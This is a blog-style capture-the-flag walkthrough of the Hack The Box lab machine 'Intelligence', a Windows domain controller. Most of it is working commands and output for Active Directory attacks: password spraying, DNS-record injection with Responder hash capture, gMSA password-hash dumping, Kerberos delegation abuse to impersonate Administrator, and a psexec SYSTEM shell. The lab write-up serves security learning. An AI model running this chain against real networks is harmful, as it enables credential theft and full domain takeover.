---
title: "Hack The Box Intelligence - Walkthrough"
datePublished: Tue Dec 14 2021 20:31:14 GMT+0000 (Coordinated Universal Time)
cuid: ckx6k8a270hyzoes1c1946de4
slug: hack-the-box-intelligence-walkthrough
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1639513282330/2AdMNq7Nc.png
tags: hacking, cybersecurity-1

---

Today we will walk through an intermediate difficulty box that shows us some nice to-know attack vectors for Windows and Active Directory in particular. 
We will do a walkthrough of the box **Intelligence** from HackTheBox (https://app.hackthebox.com/machines/357).

The first thing we always do is a ping-check. 
We can enumerate the TTL (time to live) and identify the host operating system based on it. TTL of about 64 means it's most likely a Linux-based machine, around 128 means it's a Windows-based box, and values of about 254 are Solaris-based boxes. 

### TTL
> A detailed explanation of TTL:
It represents the number of routers a packet is allowed to be passed through before expiring. 
For every router this number is decreased by 1, meaning if a Windows box should have 128 - but we see TTL 127 - then one router is between us and the box. 

### Ping check 
```bash
PING 10.10.10.248 (10.10.10.248) 56(84) bytes of data.
64 bytes from 10.10.10.248: icmp_seq=1 ttl=127 time=36.7 ms
```

We receive a TTL of 127 which indicates it is a Windows box. That is interesting and provides some details for potential next steps later during the enumeration (check for Active Directory, Kerberoasting, AS-REP roasting, unconstrained delegation and more).

As usual the next step is :drum roll: - port scanning

## Port Scanning with nmap
We note down interesting ports as well as a very large time skew of about 7h. The time skew could force us to sync our local machine time to the remote machine during a later stage (noted.) 

```bash
nmap -sCV -T4 -p- 10.10.10.248 -oN intelligence.full                                                                                                                                                      
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-24 16:56 CEST
Nmap scan report for localhost (10.10.10.248)
Host is up (0.036s latency).
Not shown: 65515 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-08-24 21:59:38Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-08-24T22:01:08+00:00; +7h01m48s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-08-24T22:01:08+00:00; +7h01m48s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-08-24T22:01:08+00:00; +7h01m48s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-08-24T22:01:08+00:00; +7h01m48s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
49718/tcp open  msrpc         Microsoft Windows RPC
62733/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h01m47s, deviation: 0s, median: 7h01m47s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-08-24T22:00:30
|_  start_date: N/A
```

We find port 53 (DNS) / 88 (Kerberos) / 389 (LDAP) which indicates that this is a domain controller.
The other interesting open ports are RPC (135 and many more), SMB (139/445), HTTP (80), Win-RM (5985).

**remember for OSCP**: from an attacker perspective, you would try the ports with the least effort first, which in this case would be:

139/445 - anonymous login via SMB (or guest accounts for that matter)
389 - anonymous LDAP enumeration to check if we can read the LAPS (local administrator password solution) 
80 - Webserver - check for hidden files / credentials / subdomains


## directory busting / finding reachable files
Recently I started testing feroxbuster but for this box I used gobuster again. Running gobuster dir reveals one interesting folder - **documents/**.

```bash
gobuster dir -fr -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.248/ -x php,html,txt -t 100 -k
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.248/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt
[+] Add Slash:               true
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
2021/08/24 17:21:48 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 7432]
/documents/           (Status: 403) [Size: 1233]
                                                
===============================================================
2021/08/24 17:27:27 Finished
===============================================================
```

We jot that down into our notes and add the IP into our `/etc/hosts` file to enumerate subdomains via `gobuster dns`, since DNS is available on the box (port 53). Unfortunately, this does not show any results. 

```bash
sudo su
echo "10.10.10.248 intelligence.htb" >> /etc/hosts
```

```bash
gobuster dns -d 10.10.10.248 -c -i -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
```

## Web application
![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1639507405716/CyDoiTzG3.png)
Checking the web application we find two downloadable pdf documents and looking at them we conduct that they are potentially numbered using a date pattern (`YYYY-MM-DD-upload.pdf`). So why don't we write a script to download all the files and go through them?!

```python
#!/usr/bin/env python

import requests
import os
# http://intelligence.htb/documents/2020-01-02-upload.pdf

os.mkdir('documents')
BASE_URL = 'http://intelligence.htb/documents/2020-'


for month in range(1,12):
  for day in range(1,31):
    
    specifics =  f'{month:02}-{day:02}-upload.pdf'
    file = requests.get(BASE_URL+specifics)
    if file.status_code == 200:
        with open(f'documents/{specifics}', 'wb') as f:
            f.write(file.content)
    else:
        continue
```

Now we could check the pdf's manually (which is what I did) or we use `pdftotext`:

```bash
for file in *.pdf; do pdftotext $file - >> text.txt; done
``` 

this reveals a lot of lorem ipsum text (this is placeholder gibberish in a non-existing language that resembles "normal" text and is frequently used in web development to visualize what "normal" text would look like) but also two notes from the IT department that are very very interesting for us - one in particular because it contains a password - `NewIntelligenceCorpUser9876`, but what is a password without a username?! Nothing! 

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1639508025480/52vV-u5bb.png)


We also check the metadata of the pdf's and find :drum roll: some names that look like real people names.

```bash
#!/bin/bash
touch names.txt

for f in documents/*.pdf
do
strings $f | grep /Creator | awk '{ print $2 }' >> names.txt
done
exit
```

that gives us the following output:
```bash
(TeX)
(Jason.Patterson)
```

Since we only want the unique usernames and also neither the TeX nor the parantheses - we use `sort -u` to filter them and then remove the parentheses + the Tex by hand (old school. maybe) and add a space instead of the . between the first name and the last name. 

```bash
cat names.txt | sort -u > unique_names.txt
```


## foothold
So now we have usernames and we could use [namemash.py](https://gist.github.com/superkojiman/11076951) to generate a potential windows username list. But let's try to enumerate usernames with `kerbrute`.


### username enumeration with kerbrute
```bash
./kerbrute_linux_amd64_1.0.3 userenum --dc 10.10.10.248 -d intelligence.htb ~/ctf/htb/intelligence/documents/names.txt 
    __             __               __                  
   / /_____  _____/ /_  _______  __/ /____  
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \      
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/       
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
                                                                          
Version: v1.0.3 (9dad6e1) - 08/25/21 - Ronnie Flathers @ropnop
                                                                 
2021/08/25 11:56:24 >  Using KDC(s):     
2021/08/25 11:56:24 >   10.10.10.248:88      
                                                                               
2021/08/25 11:56:24 >  [+] VALID USERNAME:       William.Lee@intelligence.htb 
2021/08/25 11:56:24 >  [+] VALID USERNAME:       Scott.Scott@intelligence.htb

...
(shortened for educational purposes ;) )
...

2021/08/25 11:56:24 >  Done! Tested 78 usernames (78 valid) in 0.297 seconds
```

Next on our todo list is checking if the password works for an account actually - the stage is yours `crackmapexec`. 

```bash
poetry run crackmapexec ldap 10.10.10.248 -u ~/ctf/htb/intelligence/documents/names.txt -p 'NewIntelligenceCorpUser9876'  

...
LDAP        10.10.10.248    389    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
```

Ms. Tiffany Molina has not changed her password apparently and we can log in using her account. LDAP did not reveal interesting things so we try SMB and voila, there are two non-standard shares (Users / IT). 

## user flag + webserver script
```bash
smbclient -L \\\\10.10.10.248\\ -U Tiffany.Molina -p

Enter WORKGROUP\Tiffany.Molina's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        IT              Disk      
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk      
SMB1 disabled -- no workgroup available
```
in `Users/tiffany.molina/Desktop` we find the user flag, while in the IT share we find a powershell script called `downdetector.ps1`. 

The interesting part of this script, which checks if a webserver is up periodically (every 5 minutes), is that it uses `-UseDefaultCredentials` while visiting the website and we could abuse this via responder, because responder tells the browser to please authenticate to it using NTLM. We then catch the NTLM hash and potentially (most likely) are able to crack the hash and get Mr. Ted Graves password. 

```powershell
# downdetector.ps1
# Check web server status. Scheduled to run every 5min                                                                                                                                
Import-Module ActiveDirectory-                                                  
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {                                                                           
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {                                                       
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}                                                                               
} catch {}                                                                      
}
```

## adding a DNS entry via LDAP 🤯
For this to work, we need to add a A record to the DNS entries.
How could we do this from the outside?! There is a tool called dnstool.py which is used (https://github.com/dirkjanm/krbrelayx#dnstoolpy), to create DNS entries via LDAP - mind blown 🤯.

```bash
python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -a add -r webroot.intelligence.htb -d 10.10.14.15 10.10.10.248
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
/opt/windows/krbrelayx/dnstool.py:241: DeprecationWarning: please use dns.resolver.Resolver.resolve() instead 
  res = dnsresolver.query(zone, 'SOA')
[-] Adding new record
[+] LDAP operation completed successfully
```


### catching the hash with responder
So now we have created a `DNS A Record` on the DNS server of the Domain. In theory, if we run responder.py now, we should be able to capture a hash. If I remember correctly, we had to run it in analyze mode (-A) in order to capture the hash, without poisoning the response. 



```bash
sudo responder -I tun0 -A

TED.GRAVES::intelligence:4ca6e63382f18321:08aef3a49570336d5bd888349ffca65c:010100000000000018f67c60fb99d7018dfd1338289e0ea700000000020008004a004a005300390001001e00570049004e002d0043005000350056004d005a005a004400510031005200040014004a004a00530039002e004c004f00430041004c0003003400570049004e002d0043005000350056004d005a005a0044005100310052002e004a004a00530039002e004c004f00430041004c00050014004a004a00530039002e004c004f00430041004c0008003000300000000000000000000000002000002c3fc3c6700878c995085dd56d2a2e8985dc5a10c687e986d4079d5b7e75e9710a0010000000000000000000000000000000000009003a0048005400540050002f0077006500620072006f006f0074002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy

# hashcat -m 5600 intelligence.txt rockyou.txt
```

We crack the NTLMv2-hash using rockyou and hashcat in a couple of seconds and are now able to use new credentials to authenticate and check SMB first but don't find anything interesting. So what about delegations you ask, yes lets check delegation potential with the new credentials. 


### checking for potential delegation
```bash
impacket-findDelegation intelligence.htb/Ted.Graves:Mr.Teddy
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

AccountName  AccountType                          DelegationType                      DelegationRightsTo      
-----------  -----------------------------------  ----------------------------------  -----------------------
svc_int$     ms-DS-Group-Managed-Service-Account  Constrained w/ Protocol Transition  WWW/dc.intelligence.htb
```

The user Ted Graves is able to delegate rights to the svc_int$ machine account, interesting. machine accounts are sometimes also called computer accounts and are exactly that, the accounts of the computer that is used for e.g. requesting tickets from the domain controller, they are identified via the $ sign at the end of their name. 

We also see that it is a `Group Managed Service Accounts (GMSA)` and that the ServicePrincipalName (SPN) is `WWW/dc.intelligence.htb`

### gmsa what now?
Service Accounts often have their passwords set once and are never changed after, this is security risk and can be mitigated via gMSA (group managed service accounts). This means that the Domain (Controller?) is able to change the password based on a regular schedule and that means someone has to be able to read the password in clear text, because otherwise no one would know what the current password is. So users that are able to read gMSA, can read the password (hash) (that might also be a security risk..., right Microsoft!?) similar to LAPS, where you can sometimes read the admin password in clear text... 

 
We can use a tool called gMSADumper.py (https://github.com/micahvandeusen/gMSADumper/blob/main/gMSADumper.py) which does exactly as the name suggests, dump the password hash if the user we provide is able to read it.
Let's try that:

```bash
python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::5e47bac787e5e1970cf9acdb5b316239
```


TADAAAAAA. we have the password hash, which we can use to dump tickets potentially via impacket's getST. In order to escalate our privileges, we will try to get a ticket for the administrator account, because why not?!


### Get a Ticket 
```bash
impacket-getST intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -impersonate Administrator -dc-ip 10.10.10.248 -hashes :5e47bac787e5e1970cf9acdb5b316239
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for user
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

This fails because the clock skew is too great - the what now?! As mentioned at the beginning too great of a time difference can cause the scripts to fail. So how do we fix this you ask?! We use NTP - network time protocol, and specifically, ntpdate which is a command-line tool to use an external network time server. As far as I know Domain Controllers sometimes also act as NTP servers and we have a domain controller here, so let's try to sync our time with the machine via ntpdate -

```bash
timedatectl set-ntp true
sudo apt-get install ntpdate
sudo ntpdate 10.10.10.248                                                                  
26 Aug 19:35:08 ntpdate[17403]: step time server 10.10.10.248 offset +25308.747794 sec

impacket-getST intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -impersonate Administrator -dc-ip 10.10.10.248 -hashes :5e47bac787e5e1970cf9acdb5b316239
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```


Tadaaaa we get a ticket for the administrator :O so the only thing left for us to figure out is how to use this ticket to authenticate, so we ask our favorite friend google and it tells us to export the ticket to an environment variable called `KRB5CCNAME` (https://www.onsecurity.io/blog/abusing-kerberos-from-linux/)

```bash
export KRB5CCNAME=Administrator.ccache
```

now we should be able to use psexec (impacket) to get a shell as admin, right?! right!


## root access and shell
```bash
psexec.py intelligence.htb/Administrator@dc.intelligence.htb -k -no-pass -dc-ip 10.10.10.248 -target-ip 10.10.10.248
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.10.248..... 
[*] Found writable share ADMIN$
[*] Uploading file AWLtKrZo.exe
[*] Opening SVCManager on 10.10.10.248.....
[*] Creating service IJDk on 10.10.10.248.....
[*] Starting service IJDk.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1879]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

c:\Users\Administrator\Desktop>type root.txt
6c0dbe0...<redacted>
```

Another option is to use evil-winrm or impacket's smbclient:

```bash
python3 /usr/share/doc/python3-impacket/examples/smbclient.py -k intelligence.htb/Administrator@dc.intelligence.htb -no-pass
``` 


## Shout outs 
Thank you to GameDadel, Trismah, fluxesss, aynkl2 and last but not least 0reoByte for joining the stream, giving me money to do something I love and for generally being awesome.

Until next time, friends.

Keep hacking the world and learn AD ;) 


